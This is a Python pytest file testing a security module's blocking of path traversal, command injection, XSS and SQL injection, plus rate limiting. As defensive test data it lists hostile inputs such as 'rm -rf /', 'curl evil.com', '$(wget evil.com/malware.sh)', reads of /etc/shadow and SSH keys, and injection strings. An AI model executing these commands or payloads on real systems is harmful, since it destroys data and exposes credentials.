"""
Tests for security module
"""

import pytest
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from security.security_module import SecurityModule


class TestSecurityModule:
    """Test security sanitization and validation"""
    
    def test_path_traversal_blocked(self):
        """Test that path traversal attacks are blocked"""
        security = SecurityModule()
        
        dangerous_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "/etc/shadow",
            "..\\..\\windows\\system32",
            "%2e%2e%2f",  # URL encoded ../
        ]
        
        for path in dangerous_paths:
            result = security.sanitize_path(path)
            # Should either reject or sanitize to safe path
            assert not result.startswith(".."), f"Path traversal not blocked: {path} -> {result}"
            assert not "etc/passwd" in result, f"Sensitive path not blocked: {path}"
    
    def test_command_injection_blocked(self):
        """Test that command injection is blocked"""
        security = SecurityModule()
        
        dangerous_commands = [
            "ls; rm -rf /",
            "cat file.txt && curl evil.com",
            "echo test | bash",
            "$(wget evil.com/malware.sh)",
            "`rm -rf /`"
        ]
        
        for cmd in dangerous_commands:
            # Should return False for dangerous commands
            is_safe = security.is_safe_command(cmd)
            assert not is_safe, f"Dangerous command not blocked: {cmd}"
    
    def test_safe_commands_allowed(self):
        """Test that safe commands are allowed"""
        security = SecurityModule()
        
        safe_commands = [
            "ls -la",
            "cat README.md",
            "echo Hello World",
            "pwd"
        ]
        
        for cmd in safe_commands:
            is_safe = security.is_safe_command(cmd)
            assert is_safe, f"Safe command blocked: {cmd}"
    
    def test_rate_limiting(self):
        """Test that rate limiting works"""
        security = SecurityModule()
        user_id = "test_user"
        
        # First requests should be allowed
        for i in range(5):
            assert security.check_rate_limit(user_id), f"Request {i+1} was blocked"
        
        # After many requests, should be rate limited
        # This depends on the actual rate limit implementation


class TestInputSanitization:
    """Test input sanitization"""
    
    def test_xss_prevention(self):
        """Test XSS attack prevention in text input"""
        security = SecurityModule()
        
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        
        for attack in xss_attacks:
            sanitized = security.sanitize_text(attack)
            # Should not contain script tags
            assert "<script>" not in sanitized.lower(), f"XSS not sanitized: {attack}"
            assert "javascript:" not in sanitized.lower(), f"XSS not sanitized: {attack}"
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        security = SecurityModule()
        
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
        ]
        
        for injection in sql_injections:
            sanitized = security.sanitize_sql(injection)
            # Should escape dangerous characters
            assert "--" not in sanitized or sanitized.count("'") != injection.count("'"), \
                f"SQL injection not sanitized: {injection}"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
